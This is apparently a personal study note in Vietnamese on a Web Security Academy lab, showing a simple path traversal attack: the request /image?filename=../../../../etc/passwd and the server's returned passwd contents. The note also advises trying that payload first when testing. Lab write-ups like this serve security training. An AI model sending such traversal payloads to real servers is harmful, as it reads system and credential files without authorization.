![[lab-path-traversal-simple.png]]
lab đọc `/etc/passwd` bằng `../` đơn giản nhất.

> [!NOTE] phân tích đề
> shop hiện ảnh sản phẩm qua `/image?filename=...`.
> mình đoán server ghép thẳng vào `/var/www/images/...`.
> không thấy filter gì.
> nên mình thử leo thư mục luôn.

### hướng giải
- [ ] mở 1 sản phẩm bất kỳ
- [ ] xem request `/image?filename=...`
- [ ] thử `../` từng nấc
- [ ] đọc `/etc/passwd` confirm

### giải
request gốc:

```http
GET /image?filename=116.png HTTP/1.1
Host: 0a1b02c303c9xxxx.web-security-academy.net
```

mình sửa thành:

```http
GET /image?filename=../../../../etc/passwd HTTP/1.1
Host: 0a1b02c303c9xxxx.web-security-academy.net
```

response trả về:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

-> thấy `root:x:0:0` là lụm.
=> lab báo solved luôn.
-> không cần thêm gì nữa.

liên quan:
- [[lys thuyet path traversal]]
- [[path traversal]]
- [[Lab-Path traversal absolute bypass]]

> [!NOTE] bài học
> sau khi quan sát lab này mình thấy...
> lỗi cơ bản nhất vẫn là ghép input vào path.
> nên mình khi test luôn thử `../../../../etc/passwd` đầu tiên.
> đỡ tốn time.
